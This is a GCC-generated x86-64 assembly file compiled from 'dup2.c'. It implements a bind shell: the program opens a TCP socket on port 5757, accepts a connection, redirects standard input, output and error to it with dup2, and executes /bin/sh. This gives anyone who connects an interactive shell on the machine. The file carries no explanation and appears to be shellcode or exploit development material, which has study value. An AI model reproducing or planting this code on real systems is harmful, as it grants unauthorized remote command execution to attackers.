	.file	"dup2.c"
	.section	.rodata
.LC0:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB2:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movl	$0, %edx
	movl	$1, %esi
	movl	$2, %edi
	call	socket
	movl	%eax, -4(%rbp)
	movl	$5757, -8(%rbp)
	movw	$2, -32(%rbp)
	movl	-8(%rbp), %eax
	movzwl	%ax, %eax
	movl	%eax, %edi
	call	htons
	movw	%ax, -30(%rbp)
	leaq	-32(%rbp), %rcx
	movl	-4(%rbp), %eax
	movl	$16, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	bind
	movl	-4(%rbp), %eax
	movl	$5, %esi
	movl	%eax, %edi
	call	listen
	movl	$16, -16(%rbp)
	leaq	-16(%rbp), %rdx
	leaq	-48(%rbp), %rcx
	movl	-4(%rbp), %eax
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	accept
	movl	%eax, -12(%rbp)
	movl	-12(%rbp), %eax
	movl	$0, %esi
	movl	%eax, %edi
	call	dup2
	movl	-12(%rbp), %eax
	movl	$1, %esi
	movl	%eax, %edi
	call	dup2
	movl	-12(%rbp), %eax
	movl	$2, %esi
	movl	%eax, %edi
	call	dup2
	movl	$0, %edx
	movl	$0, %esi
	movl	$.LC0, %edi
	call	execve
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE2:
	.size	main, .-main
	.ident	"GCC: (Debian 4.9.2-10) 4.9.2"
	.section	.note.GNU-stack,"",@progbits
